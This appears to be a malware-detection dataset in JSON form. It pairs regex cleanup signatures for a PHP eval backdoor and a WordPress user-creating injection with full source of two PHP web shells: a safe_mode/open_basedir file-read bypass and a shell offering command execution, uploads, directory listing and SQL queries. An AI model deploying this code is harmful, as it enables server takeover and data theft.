[
    {
        "Signature Name": "backdoor.evalphp.004",
        "Cleanup Pattern": "~\\[evalphp\\]\\s*system\\s*\\(.echo [^\\),\\|\"']+\\|\\s*base64\\s+-d\\s*\\|\\s*tee \\w+\\.php[\"'];\\s*\\[/evalphp\\]~",
        "Triggers": ["base64", "[evalphp]"],
        "Full Chain": ["base64", "[evalphp]", "[evalphp]system ('echo "]
    },
    {
        "code_snippet": "if(!empty($_GET['file'])) $file=$_GET['file']; \nelse if(!empty($_POST['file'])) $file=$_POST['file']; \n\necho '<PRE><P>This is exploit from <a \nhref=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By KingDefacer</a> labs. \nTurkish H4CK3RZ \n<p><b> [Turkish Security Network] - Edited By KingDefacer\n<p>PHP 5.2.9 safe_mode & open_basedir bypass \n<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> \n<p><form name=\"form\" action=\"http://' . $_SERVER[\"HTTP_HOST\"] . htmlspecialchars($_SERVER[\"SCRIPT_NAME\"]) . $_SERVER[\"PHP_SELF\"] . '\" method=\"post\"><input type=\"text\" name=\"file\" size=\"50\" value=\"' . htmlspecialchars($file) . '\"><input type=\"submit\" name=\"hardstylez\" value=\"Show\"></form>'; \n\n$level=0; \n\nif(!file_exists(\"file:\")) \n    mkdir(\"file:\"); \nchdir(\"file:\"); \n$level++; \n\n$hardstyle = explode(\"/\", $file); \n\nfor($a=0;$a<count($hardstyle);$a++){ \n    if(!empty($hardstyle[$a])){ \n        if(!file_exists($hardstyle[$a]))  \n            mkdir($hardstyle[$a]); \n        chdir($hardstyle[$a]); \n        $level++; \n    } \n} \n\nwhile($level--) chdir(\"..\"); \n\n$ch = curl_init(); \n\ncurl_setopt($ch, CURLOPT_URL, \"file:file:///\" . $file); \n\necho '<FONT COLOR=\"RED\"> <textarea rows=\"40\" cols=\"120\">'; \n\nif(FALSE==curl_exec($ch)) \n    die('>Sorry... File ' . htmlspecialchars($file) . ' doesnt exists or you dont have permissions.'); \necho ' </textarea> </FONT>'; \n\ncurl_close($ch);"
    },
    {
        "Signature Name": "injected.wp_user_creator.001",
        "Cleanup Pattern": "~(<svg\\W+onload=)?eval\\(String.fromCharCode\\(118,97,114,32,97,106,97,120,82,101,113[^<]+,116,46,115,101,110,100,40,112,97,114,97,109,115,41,;\\)(?(1)>)~",
        "Triggers": ["eval(", "fromCharCode", "97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,_w,p,n,o,n,c,e"],
        "Full Chain": ["eval(", "fromCharCode", "97,99,116,105,111,110=crearusuario&_wpnonce", "eval(String.fromCharCode(118,", "97,", "106,", "97,", "120,", "82,", "101,", "113,", "117,", "101,", "115,"]
    },
    {
        "code_snippet":"ob_implicit_flush();\nif(isset($_REQUEST['f'])){\n        $filename=$_REQUEST['f'];\n        $file=fopen(\"$filename\",\"rb\");\n        fpassthru($file);\n        die;\n}\nif(isset($_REQUEST['d'])){\n        $d=$_REQUEST['d'];\n        echo \"<pre>\";\n        if ($handle = opendir(\"$d\")) {\n        echo \"<h2>listing of $d</h2>\";\n                   while ($dir = readdir($handle)){ \n                       if (is_dir(\"$d/$dir\")) echo \"<a href='$PHP_SELF?d=$d/$dir'><font color=grey>\";\n\t\t\t\t\t\t\telse echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";\n                       echo \"$dir\\n\"; \n                       echo \"</font></a>\";\n                }\n                       \n        } else echo \"opendir() failed\";\n        closedir($handle);\n        die (\"<hr>\"); \n}\nif(isset($_REQUEST['c'])){\n\techo \"<pre>\";\n\tsystem($_REQUEST['c']);\t\t   \n\tdie;\n}\nif(isset($_REQUEST['upload'])){\n\n\t\tif(!isset($_REQUEST['dir'])) die('hey,specify directory!');\n\t\t\telse $dir=$_REQUEST['dir'];\n\t\t$fname=$HTTP_POST_FILES['file_name']['name'];\n\t\tif(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))\n\t\t\tdie('file uploading error.');\n}\nif(isset($_REQUEST['mquery'])){\n\t\n\t$host=$_REQUEST['host'];\n\t$usr=$_REQUEST['usr'];\n\t$passwd=$_REQUEST['passwd'];\n\t$db=$_REQUEST['db'];\n\t$mquery=$_REQUEST['mquery'];\n\tmysql_connect(\"$host\", \"$usr\", \"$passwd\") or\n    die(\"Could not connect: \" . mysql_error());\n    mysql_select_db(\"$db\");\n    $result = mysql_query(\"$mquery\");\n\tif($result!=FALSE) echo \"<pre><h2>query was executed correctly</h2>\\n\";\n    while ($row = mysql_fetch_array($result,MYSQL_ASSOC)) print_r($row);  \n    mysql_free_result($result);\n\tdie;\n}\n?>\n<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input type=\"text\" name=\"c\"><input type=\"submit\" value=\"go\"><hr></form> \n<form enctype=\"multipart/form-data\" action=\"<?php echo $PHP_SELF; ?>\" method=\"post\"><input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000000000\">\nupload file:<input name=\"file_name\" type=\"file\">   to dir: <input type=\"text\" name=\"dir\">&nbsp;&nbsp;<input type=\"submit\" name=\"upload\" value=\"upload\"></form>\n<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory here]\n<br>for example:\nhttp://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix\nor http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win\n<hr>execute mysql query:\n<form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >\nhost:<input type=\"text\" name=\"host\"value=\"localhost\">  user: <input type=\"text\" name=\"usr\" value=root> password: <input type=\"text\" name=\"passwd\">\n\ndatabase: <input type=\"text\" name=\"db\">  query: <input type=\"text\" name=\"mquery\"> <input type=\"submit\" value=\"execute\">\n</form>"
    }
]
